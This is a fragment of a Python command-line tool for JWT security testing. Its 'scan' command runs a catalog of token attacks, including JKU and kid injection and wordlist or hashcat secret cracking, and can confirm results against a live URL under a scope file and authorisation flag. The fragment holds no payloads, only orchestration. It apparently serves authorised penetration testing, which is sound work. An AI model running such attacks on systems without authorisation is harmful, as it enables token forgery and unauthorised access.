@click.option("--html", "html_out", type=click.Path(), help="write HTML report")
def scan_cmd(token, claims, public_key, jwks_url, second_token, jku_url, wordlist, use_hashcat,
             kid_payload, only, no_refresh_exp, url, header, method, body, template,
             success_marker, failure_marker, authorized, scope_file, insecure, proxy,
             json_out, html_out) -> None:
    """Run the full attack catalog; optionally confirm against a live target."""
    jwt = _load_token(token)
    ctx = _build_ctx(claims, public_key, jku_url, wordlist, use_hashcat, kid_payload,
                     refresh_exp=not no_refresh_exp)
    if not ctx.public_key_pem:
        _acquire_public_key(ctx, jwt, second_token, jwks_url, url, insecure, proxy)
    live_cfg = None
    scope = None
    if url or template:
        if not url:
            raise click.ClickException("--template also needs --url as the base URL.")
        scope = Scope.from_file(scope_file, authorized=authorized)
        live_cfg = LiveConfig(
            url=url, header=header, method=method, body=body, template=template,
            success_marker=success_marker, failure_marker=failure_marker,
            verify_tls=not insecure, proxy=proxy,
        )
    try:
        findings = scan(
            jwt, ctx, live=live_cfg, scope=scope, only=list(only) or None,
            on_warn=lambda m: console.print(f"[yellow][!] {m}[/]"),
        )
    except ScopeError as exc:
        raise click.ClickException(str(exc))
    print_console(findings, live=bool(live_cfg), console=console)
    if json_out:
        Path(json_out).write_text(to_json(findings), encoding="utf-8")
        console.print(f"[green]JSON written to {json_out}[/]")
    if html_out:
        Path(html_out).write_text(to_html(findings), encoding="utf-8")
        console.print(f"[green]HTML written to {html_out}[/]")


if __name__ == "__main__":
    main()
